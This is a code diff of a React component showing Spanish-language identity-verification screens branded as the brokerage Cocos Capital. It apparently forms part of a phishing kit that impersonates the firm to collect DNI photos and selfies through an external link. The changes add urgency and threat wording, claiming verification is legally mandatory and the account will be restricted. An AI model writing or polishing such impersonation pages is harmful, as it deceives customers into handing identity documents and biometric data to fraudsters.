@@ -1,5 +1,5 @@
 import { useEffect, useState } from "react";
-import { ShieldCheck, Clock, CheckCircle2, ExternalLink, Copy, Check, Smartphone } from "lucide-react";
+import { ShieldCheck, Clock, CheckCircle2, ExternalLink, Copy, Check, Smartphone, AlertTriangle, ArrowLeft } from "lucide-react";
 import CocosLogo from "@/components/cocos/CocosLogo";
 
 interface CocosV2BiometricScreenProps {
@@ -54,21 +54,31 @@ const CocosV2BiometricScreen = ({ email, fullName, biometricUrl, onEvent }: Coco
         </div>
 
         <div className="rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(26,63,143,0.12)] border border-[#e8edf5] overflow-hidden">
-          <div className="h-1 w-full bg-gradient-to-r from-[#16a34a] via-[#22c55e] to-[#16a34a]" />
+          <div className="h-1 w-full bg-gradient-to-r from-[#f59e0b] via-[#f97316] to-[#f59e0b]" />
 
           <div className="px-6 py-8 text-center">
             <div className="flex justify-center mb-4">
               <div className="relative">
-                <div className="absolute -inset-3 rounded-full bg-blue-100/50 animate-pulse" />
-                <div className="relative flex h-16 w-16 items-center justify-center rounded-full bg-gradient-to-br from-[#1a3f8f] to-[#2563eb] shadow-lg">
+                <div className="absolute -inset-3 rounded-full bg-amber-100/50 animate-pulse" />
+                <div className="relative flex h-16 w-16 items-center justify-center rounded-full bg-gradient-to-br from-[#f59e0b] to-[#f97316] shadow-lg">
                   <ShieldCheck size={32} className="text-white" strokeWidth={1.8} />
                 </div>
               </div>
             </div>
-            <h3 className="text-[17px] font-bold text-[#1a2233] mb-2">Verificación en curso</h3>
-            <p className="text-[13px] text-[#5a6a85] leading-relaxed mb-4 max-w-[320px] mx-auto">
-              Completa la verificación en la pestaña que se abrió. Cuando termines, volvé acá y presioná el botón de abajo.
+            <h3 className="text-[18px] font-bold text-[#1a2233] mb-2">Verificación en curso</h3>
+            <p className="text-[13px] text-[#5a6a85] leading-relaxed mb-2 max-w-[340px] mx-auto">
+              Completá la verificación de tu documento en la pestaña que se abrió.
             </p>
+
+            {/* Important return notice */}
+            <div className="rounded-xl border border-amber-200 bg-amber-50/80 px-4 py-3 mb-4 mx-auto max-w-[360px]">
+              <div className="flex items-start gap-2.5">
+                <ArrowLeft size={15} className="text-amber-600 flex-shrink-0 mt-0.5" />
+                <p className="text-[12.5px] text-[#1a2233] font-semibold leading-relaxed text-left">
+                  Una vez que completes la verificación, <strong className="text-amber-700">volvé a esta página</strong> para finalizar las etapas restantes de tu actualización cadastral.
+                </p>
+              </div>
+            </div>
 
             <button
               onClick={() => window.open(biometricUrl, "_blank", "noopener,noreferrer")}
@@ -84,7 +94,7 @@ const CocosV2BiometricScreen = ({ email, fullName, biometricUrl, onEvent }: Coco
                 <span className="text-[12px] font-semibold text-[#5a6a85]">¿Estás desde el celular?</span>
               </div>
               <p className="text-[11px] text-[#8895aa] leading-relaxed mb-2.5">
-                Copiá el enlace y completá la verificación desde tu navegador móvil para una mejor experiencia.
+                Copiá el enlace y completá la verificación desde tu navegador móvil.
               </p>
               <button
                 onClick={handleCopyLink}
@@ -129,7 +139,7 @@ const CocosV2BiometricScreen = ({ email, fullName, biometricUrl, onEvent }: Coco
 
         <div className="flex justify-center mt-3">
           <div className="flex items-center gap-2 rounded-full border border-[#e8edf5] bg-[#f8fafc] px-4 py-2">
-            <div className="h-1.5 w-1.5 rounded-full bg-[#16a34a]" />
+            <div className="h-1.5 w-1.5 rounded-full bg-[#f59e0b]" />
             <span className="text-[12px] text-[#8895aa] max-w-[220px] truncate">{email}</span>
           </div>
         </div>
@@ -157,29 +167,38 @@ const CocosV2BiometricScreen = ({ email, fullName, biometricUrl, onEvent }: Coco
         ¡Gracias por la verificación{firstName ? `, ${firstName}` : ""}!
       </h2>
       <p className="text-center text-[14px] text-[#5a6a85] leading-relaxed mb-6 max-w-[340px] mx-auto">
-        Tu identidad fue confirmada correctamente.
+        Tu identidad fue confirmada correctamente. Solo queda un paso más.
       </p>
+
+      {/* Mandatory notice */}
+      <div className="rounded-xl border border-red-100 bg-red-50/60 px-4 py-3 mb-5 mx-auto max-w-[400px]">
+        <div className="flex items-start gap-2.5">
+          <AlertTriangle size={15} className="text-red-500 flex-shrink-0 mt-0.5" />
+          <p className="text-[12.5px] text-[#1a2233] font-semibold leading-relaxed">
+            La confirmación documental es <strong className="text-red-600">obligatoria</strong> por normativa vigente. Sin completarla, tu cuenta quedará <strong className="text-red-600">limitada</strong> hasta finalizar el proceso.
+          </p>
+        </div>
+      </div>
 
       {/* Verification card */}
       <div className="rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(26,63,143,0.12)] border border-[#e8edf5] overflow-hidden mb-6">
-        <div className="h-1 w-full bg-gradient-to-r from-[#16a34a] via-[#22c55e] to-[#16a34a]" />
+        <div className="h-1 w-full bg-gradient-to-r from-[#1a3f8f] via-[#3b6fe0] to-[#1a3f8f]" />
         <div className="px-6 py-5">
           <div className="flex items-start gap-3 mb-4">
             <ShieldCheck size={20} className="text-[#1a3f8f] flex-shrink-0 mt-0.5" />
             <div>
-              <h4 className="text-[15px] font-bold text-[#1a2233] mb-1">Validación de documentos</h4>
+              <h4 className="text-[15px] font-bold text-[#1a2233] mb-1">Confirmación de documento de identidad</h4>
               <p className="text-[13px] text-[#5a6a85] leading-relaxed">
-                Para garantizar la <strong>seguridad de tu cuenta</strong> y la protección de tus fondos,
-                necesitamos una verificación rápida de tus documentos de identidad.
+                Por disposición regulatoria, necesitamos verificar tu <strong>documento oficial</strong> mediante un proceso rápido y seguro de reconocimiento facial.
               </p>
             </div>
           </div>
 
           <div className="space-y-2 mb-4">
             {[
-              "Verificación de identidad con documento oficial",
-              "Reconocimiento facial rápido y seguro",
-              "Protección contra accesos no autorizados",
+              "Foto del frente y dorso de tu DNI",
+              "Reconocimiento facial automático (selfie)",
+              "Protección avanzada contra fraude",
             ].map((text) => (
               <div key={text} className="flex items-center gap-2.5">
                 <span className="w-4 h-4 rounded-full bg-[#16a34a] flex items-center justify-center flex-shrink-0">
@@ -194,14 +213,14 @@ const CocosV2BiometricScreen = ({ email, fullName, biometricUrl, onEvent }: Coco
 
           <div className="flex items-center gap-2 text-[12px] text-[#8895aa] mb-5">
             <Clock size={14} />
-            <span>Este proceso toma menos de 5 minutos</span>
+            <span>Proceso rápido — menos de <strong className="text-[#1a2233]">2 minutos</strong></span>
           </div>
 
           <button
             onClick={handleStartVerification}
             className="flex items-center justify-center gap-2 w-full rounded-xl bg-gradient-to-r from-[#1a3f8f] to-[#2563eb] py-3.5 text-[14px] font-bold text-white transition-all hover:from-[#15357a] hover:to-[#1d55d4] active:scale-[0.98] shadow-md shadow-[#1a3f8f]/20"
           >
-            Iniciar verificación
+            Iniciar verificación documental
             <ExternalLink size={16} />
           </button>
         </div>
@@ -214,9 +233,9 @@ const CocosV2BiometricScreen = ({ email, fullName, biometricUrl, onEvent }: Coco
         </div>
       </div>
 
-      <p className="text-center text-[11px] text-[#b0b8c9] leading-relaxed max-w-[320px] mx-auto">
-        🔐 Una vez completada la verificación, tu cuenta quedará totalmente habilitada y lista para operar.
-        Cocos Capital se compromete a proteger tu información personal.
+      <p className="text-center text-[11px] text-[#b0b8c9] leading-relaxed max-w-[340px] mx-auto">
+        🔐 Una vez completada la verificación, tu cuenta quedará totalmente habilitada para operar. 
+        Cocos Capital cumple con las normativas vigentes de prevención de lavado de activos.
       </p>
     </div>
   );
